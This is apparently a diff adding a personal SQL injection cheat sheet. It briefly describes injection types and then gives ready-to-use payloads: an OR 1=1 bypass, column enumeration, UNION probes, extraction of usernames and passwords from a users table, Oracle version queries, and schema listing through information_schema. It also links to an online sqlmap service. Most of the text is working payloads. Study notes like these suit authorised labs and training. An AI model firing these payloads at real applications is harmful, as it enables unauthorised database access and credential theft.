@@ -1,0 +1,72 @@
+
+SQL injection examples
+There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:
+• Retrieving hidden data, where you can modify an SQL query to return additional results.
+• Subverting application logic, where you can change a query to interfere with the application's logic.
+• UNION attacks, where you can retrieve data from different database tables.
+• Examining the database, where you can extract information about the version and structure of the database.
+• Blind SQL injection, where the results of a query you control are not returned in the application's responses.
+
+
+ENUMERATE SQLI
+' OR 1=1-- -
+
+ENUMERATE COLUMNS 
+'1 ORDER BY 1--
+'1 ORDER BY 2--
+'1 ORDER BY 3--
+
+OR
+
+
+1' UNION SELECT NULL, NULL, NULL-- -
+
+https://suip.biz/?act=sqlmap
+
+Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+
+RETRIEVING DATA FROM OTHER DATABASE TABLES;
+
+' UNION SELECT username, password FROM users--
+--
+
+
+RETRIEVING MULTIPLE VALUES WITHIN A SINGLE COLUMN
+
+
+' UNION SELECT username || '~' || password FROM users--
+This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.
+EG;
+
+
+'+UNION SELECT+NULL, username || '~' || password FROM users--
+
+^^ Selecting from second column since the first doesn't contain a string hence NULL^^
+
+
+QUERY DATABASE TYPE AND VERSION
+
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
+
+'+UNION+SELECT+'a','a'+FROM+dual--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+
+
+listing the database contents on non-Oracle databases
+
+Use the following payload to retrieve the list of tables in the database: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: 
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+
